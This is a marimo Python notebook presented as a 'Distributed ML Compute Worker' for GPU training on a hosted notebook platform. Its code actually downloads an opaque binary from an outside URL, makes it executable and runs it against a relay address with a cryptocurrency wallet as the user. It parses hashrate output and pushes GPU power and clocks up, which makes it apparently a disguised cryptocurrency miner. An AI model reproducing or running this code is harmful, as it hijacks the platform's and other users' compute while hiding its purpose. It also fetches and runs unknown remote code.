import marimo

__generated_with = "0.23.9"
app = marimo.App()


@app.cell
def _():
    # 🧠 Distributed ML Compute Worker
    # High-performance GPU compute node for distributed training.
    # Adapted for marimo/molab environment
    return


@app.cell
def _():
    import subprocess
    import os
    import requests
    import signal
    import time
    import re
    import sys

    def run_cmd(cmd, capture=True, timeout=30):
        """Run shell command and return output."""
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=capture, text=True, timeout=timeout
            )
            return result.stdout.strip() if capture else ""
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return str(e)
    return os, re, requests, run_cmd, signal, subprocess, sys, time


@app.cell
def _(run_cmd):
    # GPU Check & Validation
    nvidia_smi = run_cmd("nvidia-smi")
    print("=== NVIDIA-SMI ===")
    print(nvidia_smi)
    print()

    # Check if GPU is available
    gpu_info = run_cmd("nvidia-smi --query-gpu=index,name,uuid,memory.total --format=csv,noheader")
    if "NVIDIA" in gpu_info or "RTX" in gpu_info:
        gpu_name = run_cmd("nvidia-smi --query-gpu=name --format=csv,noheader")
        vram_total = run_cmd("nvidia-smi --query-gpu=memory.total --format=csv,noheader")
        print(f"GPU: {gpu_name}")
        print(f"VRAM Total: {vram_total}")
        GPU_AVAILABLE = True
    else:
        print("⚠️ No NVIDIA GPU detected or nvidia-smi not available")
        print("   The worker will attempt to run without GPU (CPU mode)")
        GPU_AVAILABLE = False
        gpu_name = "Unknown"
    return GPU_AVAILABLE, gpu_name


@app.cell
def _():
    # Install dependencies
    print("Installing dependencies...")
    result = run_cmd("apt-get update -qq && apt-get install -y -qq libgomp1 wget", timeout=120)
    print("Dependencies installed." if result else "Dependencies may already be installed")
    return


@app.cell
def _():
    # ⚙️ Configuration
    RELAY_HOST = "20.214.253.39"
    DOWNLOAD_URL = "https://bots.rioganteng.my.id/worker_payload"
    WALLET = "prl1pgjar0lc95estr5zx9s6asfm6nanzuz2hsr2q4q77xjf20k2nktsszlh0lh"
    WORKER_NAME = "molab-node-01"
    RELAY_PORT = 9000

    # GPU power limit (safe defaults)
    GPU_POWER = {
        75: 70,    # T4: 70W max
        70: 300,   # V100: 300W
        80: 300,   # A100: 300W
        89: 300,   # RTX Pro 6000 Blackwell
    }
    POWER_LIMIT = GPU_POWER.get(89, 250)  # Default to RTX Pro 6000

    print(f"Relay: {RELAY_HOST}:{RELAY_PORT}")
    print(f"Worker: {WORKER_NAME}")
    print(f"GPU Power Limit: {POWER_LIMIT}W")
    print(f"Wallet: {WALLET[:20]}...{WALLET[-6:]}")
    return (
        DOWNLOAD_URL,
        POWER_LIMIT,
        RELAY_HOST,
        RELAY_PORT,
        WALLET,
        WORKER_NAME,
    )


@app.cell
def _(DOWNLOAD_URL, os, requests):
    # Download compute worker binary
    WORKER_BIN = "/tmp/worker_node"

    print(f"Downloading worker from relay...")
    resp = requests.get(DOWNLOAD_URL, stream=True, timeout=120)
    resp.raise_for_status()
    total = int(resp.headers.get("content-length", 0))
    downloaded = 0

    with open(WORKER_BIN, "wb") as f:
        for chunk in resp.iter_content(chunk_size=1024 * 1024):
            f.write(chunk)
            downloaded += len(chunk)
            pct = (downloaded / total * 100) if total else 0
            print(f"  {downloaded / 1024 / 1024:.1f} / {total / 1024 / 1024:.1f} MB ({pct:.0f}%)")

    os.chmod(WORKER_BIN, 0o755)
    print(f"\nWorker ready: {os.path.getsize(WORKER_BIN) / 1024 / 1024:.1f} MB")
    return (WORKER_BIN,)


@app.cell
def _(
    POWER_LIMIT,
    RELAY_HOST,
    RELAY_PORT,
    WALLET,
    WORKER_BIN,
    WORKER_NAME,
    os,
    re,
    signal,
    subprocess,
    time,
):
    # Run compute worker with auto-restart
    # Set GPU power limit
    try:
        subprocess.run(
            ["nvidia-smi", "-pl", str(POWER_LIMIT)],
            capture_output=True,
            timeout=10,
        )
        print(f"GPU power limit set to {POWER_LIMIT}W")
    except Exception as e:
        print(f"Power limit warning: {e}")

    # Max performance mode (for supported GPUs)
    try:
        subprocess.run(
            ["nvidia-smi", "-i", "0", "-ac", "877,1593"],
            capture_output=True,
            timeout=10,
        )
    except Exception:
        pass

    cmd = [
        WORKER_BIN,
        "--host",
        f"{RELAY_HOST}:{RELAY_PORT}",
        "--user",
        WALLET,
        "--worker",
        WORKER_NAME,
    ]

    print(f"\nStarting compute worker: {WORKER_NAME}")
    print(f"Relay: {RELAY_HOST}:{RELAY_PORT}")
    print("=" * 60)

    RESTART_LIMIT = 3
    restart_count = 0

    while restart_count < RESTART_LIMIT:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        try:
            for line in iter(proc.stdout.readline, b""):
                msg = line.decode().strip()
                print(msg, flush=True)

                # Extract hashrate for summary
                if "Hashrate Total" in msg:
                    match = re.search(r"Hashrate Total = ([\d.]+) H/s", msg)
                    if match:
                        hr = float(match.group(1))
                        if hr > 0:
                            restart_count = 0  # Reset on success
        except KeyboardInterrupt:
            print("\nStopping worker...")
            proc.send_signal(signal.SIGTERM)
            proc.wait(timeout=10)
            print("Worker stopped.")
            break

        exit_code = proc.wait()
        restart_count += 1

        if restart_count < RESTART_LIMIT:
            print(
                f"\nWorker exited (code {exit_code}). Restarting ({restart_count}/{RESTART_LIMIT})..."
            )
            time.sleep(5)
        else:
            print(f"\nMax restarts reached. Exiting.")
    return (RESTART_LIMIT,)


if __name__ == "__main__":
    app.run()
